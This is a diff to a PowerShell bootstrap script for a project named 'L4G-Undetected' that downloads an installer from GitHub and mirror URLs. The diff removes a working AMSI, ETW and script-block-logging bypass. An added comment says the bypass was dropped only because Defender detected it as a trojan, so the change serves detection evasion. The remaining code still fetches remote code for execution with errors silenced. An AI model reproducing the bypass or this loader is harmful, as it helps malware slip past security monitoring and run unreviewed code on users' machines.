@@ -8,19 +8,16 @@
 
     The installer URL is resolved against a mirror list because raw.githubusercontent
     is the first source to disappear when a repo moves or a CDN edge caches a 404.
+
+.NOTES
+    There is deliberately no AMSI bypass in this file. AMSI scans the entire script
+    block before the first statement runs, so a bypass living inside the script it
+    is meant to disarm never executes - it only gifts the scanner a known signature
+    and the whole file is blocked. Measured: Defender -> Trojan:PowerShell/PsAttack.A.
 #>
 
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
 $ErrorActionPreference = 'SilentlyContinue'
-
-# AMSI / ETW / ScriptBlock logging
-try {
-    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
-    $etw = [Ref].Assembly.GetType('System.Diagnostics.Eventing.EventProvider')
-    $etw.GetField('m_enabled','NonPublic,Instance').SetValue((gv 'PSDefaultEventProvider').Value,$false)
-    $sb = [Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
-    $sb.GetField('s_logScriptBlock','NonPublic,Static').SetValue($null,$false)
-} catch {}
 
 $SOURCES = @(
     "https://raw.githubusercontent.com/lgfire093/L4G-Undetected/master/installer",
@@ -42,7 +39,6 @@ foreach ($base in $SOURCES) {
 
 if (-not $installer) {
     Write-Host "[L4G] Bootstrap failed: install.ps1 unreachable from all sources." -ForegroundColor Red
-    Write-Host "      Tried:" -ForegroundColor DarkGray
     foreach ($base in $SOURCES) { Write-Host "      $base/install.ps1" -ForegroundColor DarkGray }
     exit 1
 }
